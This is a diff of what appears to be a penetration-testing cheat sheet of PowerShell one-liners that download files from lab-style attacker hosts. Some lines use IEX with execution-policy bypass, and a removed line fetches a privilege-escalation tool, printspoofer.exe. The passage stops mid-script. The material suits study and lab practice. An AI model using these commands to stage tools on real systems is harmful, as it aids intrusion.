@@ -2,51 +2,52 @@ USING POWERSHELL -
 ------------------------------------------------------------------------------------------------------------------
 
 
-#### Detecting Open Port
+#### 
+**Web Content Download**
 	
     powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/demo.txt','c:\temp\demo.txt')
 
-**Nmap Scripts**
+**Powershell BitsTransfer**
 
     powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://10.10.10.10/demo.txt' -Destination 'c:\temp\demo.txt'"
 
-**Banner Grabbing**
+**Web Content Download**
 	
     $webClient.DownloadFile('http://10.10.10.10:80/demo.txt','c:\temp\demo.txt')
 
-**Banner Grabbing**
+**Powershell Direct URI**
 	
-    iwr -uri http://192.168.45.240/printspoofer.exe -Outfile printspoofer.exe
+    iwr -uri http://192.168.45.240/demo.txt -Outfile demo.txt
 
-**Banner Grabbing**
+**Web Content Download**
 	
     powershell.exe IEX(New-Object System.Net.WebClient).downloadFile('http://10.10.10.10:80/demo.txt','C:\temp\demo.txt')
 
-**Banner Grabbing**
+**Web Content Download**
 	
     powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "IEX(New-Object System.Net.WebClient).downloadFile('http://10.10.10.10/demo.txt','C:\temp\demo.txt')"
 
-**Banner Grabbing**
+**Powershell IEX**
 
     echo IEX(New-Object System.Net.WebClient).downloadFile('http://10.10.10.10:80/demo.txt','C:\temp\demo.txt') | powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile
 
-**Banner Grabbing**
+**Powershell Wget**
 	
     powershell.exe -c wget "http://10.10.14.17/demo.txt" -outfile "c:\temp\demo.txt"
 
-**Banner Grabbing**
+**Powershell Curl**
 	
     powershell.exe -c "curl.exe http://10.10.10.10:80/demo.txt c:\temp\demo.txt"	
 
-**Banner Grabbing**
+**Web Content Download**
 	
     powershell.exe Invoke-RestMethod -Uri "http://10.10.10.10/demo.txt" -OutFile "c:\temp\demo.txt"
 
-**Banner Grabbing**
+**Web Content Download**
 	
     powershell.exe Invoke-webRequest -Uri "http://10.10.10.10/demo.txt" -OutFile "c:\temp\demo.txt"
 
-**Banner Grabbing**
+**Using file**
 	
     echo '$storageDir = $pwd' > wget.ps1
     echo '$webclient = New-Object System.Net.WebClient' >> wget.ps1
